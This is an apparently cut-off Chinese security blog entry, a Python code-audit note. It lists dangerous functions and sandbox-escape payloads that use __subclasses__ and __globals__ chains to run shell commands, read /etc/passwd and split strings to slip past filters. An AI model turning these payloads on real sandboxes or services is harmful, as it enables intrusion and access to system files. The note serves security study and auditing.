    <category term="无人机" scheme="https://www.ascotbe.com/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/"/>
    
    <category term="无人机配件" scheme="https://www.ascotbe.com/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>代码审计笔记（Python）</title>
    <link href="https://www.ascotbe.com/2022/09/22/Python/"/>
    <id>https://www.ascotbe.com/2022/09/22/Python/</id>
    <published>2022-09-22T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.870Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p><del>收拾收拾下自己，发现好久没有学习了，上半年状态真的好差，之前学习也静不下心来</del></p><p>从比较简单的语言开始学习，看看能不能有啥好东西</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/1.png" alt="1" style="zoom: 33%;" /></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="标准库危险模块"><a href="#标准库危险模块" class="headerlink" title="标准库危险模块"></a>标准库危险模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">platform.popen(<span class="string">&#x27;dir&#x27;</span>).read() <span class="comment"># 仅限于python2</span></span><br><span class="line">subprocess.call([<span class="string">&#x27;ifconfig&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br><span class="line">sys.call_tracing(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br></pre></td></tr></table></figure><h3 id="内置危险函数"><a href="#内置危险函数" class="headerlink" title="内置危险函数"></a>内置危险函数</h3><p>在python中,我们知道,不用引入直接使用的内置函数称为 <strong>builtin</strong> 函数，execfile可以执行任意文本中的python函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os;os.system(&#x27;ifconfig&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>);  <span class="comment"># 过滤空格</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>);system(<span class="string">&#x27;ls&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> os;<span class="built_in">map</span>(os.system,[<span class="string">&#x27;ifconfig&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="globals-模块"><a href="#globals-模块" class="headerlink" title="__globals__模块"></a>__globals__模块</h3><p>该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<code>__globals__</code>属性访问全局的变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(a)</span><br><span class="line">[<span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;func_closure&#x27;</span>, <span class="string">&#x27;func_code&#x27;</span>, <span class="string">&#x27;func_defaults&#x27;</span>, <span class="string">&#x27;func_dict&#x27;</span>, <span class="string">&#x27;func_doc&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;a&#x27;</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.func_globals</span><br><span class="line">&#123;<span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;a&#x27;</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>)</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">10.18</span><span class="number">.69</span><span class="number">.174</span>  netmask <span class="number">255.255</span><span class="number">.248</span><span class="number">.0</span>  broadcast <span class="number">10.18</span><span class="number">.71</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::20c:29ff:fe7d:da26  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:0c:<span class="number">29</span>:7d:da:<span class="number">26</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">16332</span>  <span class="built_in">bytes</span> <span class="number">8119588</span> (<span class="number">7.7</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">1538</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">5406</span>  <span class="built_in">bytes</span> <span class="number">498612</span> (<span class="number">486.9</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><p><strong>func_globals</strong>和 <strong>__globals__</strong> 作用是一样的，如果过滤了<code>__builtin__</code>中的内容，这样 <strong>__globals__</strong> 里面的<code>__builtins__</code>也就没有什么意义了，即使重新<code>import __builtin__</code> 还是一样.</p><h3 id="Magic-Method（魔术方法）"><a href="#Magic-Method（魔术方法）" class="headerlink" title="Magic Method（魔术方法）"></a>Magic Method（魔术方法）</h3><div class="note success modern"><p>直接输出结论，基于Python2。如果是Python3那么<code>__subclasses__()[xx]</code>中的xx值需要自己找</p></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 等效于下面语句，但是无法绕过</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>尝试利用继承关系来找到object类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__</span><br><span class="line">&#123;&#125;.__class__.__bases__</span><br></pre></td></tr></table></figure><p>查看可以使用的模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;odict_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.SimpleNamespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;longrange_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_array_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_bitmap_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_collision_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token.MISSING&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;moduledef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.FrozenImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ImportLockContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.lock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._BytesIOBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zipimport._ZipImportResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.Codec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamReaderWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamRecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abc._abc_data&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;abc.ABC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_itemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Hashable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.AsyncIterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_reverseiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.DynamicClassAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types._GeneratorWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.accumulate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee_dataobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reprlib.Repr&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> 